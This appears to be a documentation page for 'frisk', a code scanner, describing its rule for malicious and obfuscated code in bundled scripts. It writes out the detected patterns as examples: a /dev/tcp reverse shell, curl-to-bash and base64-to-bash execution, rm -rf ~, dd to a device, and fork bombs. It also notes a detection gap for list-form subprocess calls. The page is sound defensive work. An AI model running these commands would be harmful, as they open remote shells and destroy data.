# Malicious and obfuscated code

**Category:** malicious-code · **OWASP:** ASI05 (Code Execution and Supply Chain)
**Fixtures:** `test/fixtures/malicious/reverse-shell`, `test/fixtures/malicious/obfuscated-payload`

## What it is

Bundled scripts that execute attacker code: a reverse shell
(`bash -i >& /dev/tcp/host/port`), a download-and-execute
(`curl ... | bash`), an obfuscated payload (`base64 -d | bash`), or destructive
operations (`rm -rf ~`, `dd of=/dev/...`, fork bombs).

## How frisk detects it

The malicious-code rule carries a signature set. Remote execution, reverse
shells, decode-then-pipe-to-shell, and destructive operations are high severity.
Weaker dynamic-execution signals (`os.system`, `shell=True`, `eval`,
`child_process.exec`) are medium, because they have legitimate uses.

## Honest limits

The list-form `subprocess.run([...])` is intentionally not flagged (no shell),
which means a benign linter or formatter stays green; an attacker who hides a
command in that form would also stay quiet. The `--llm` pass helps catch intent
the signatures miss.
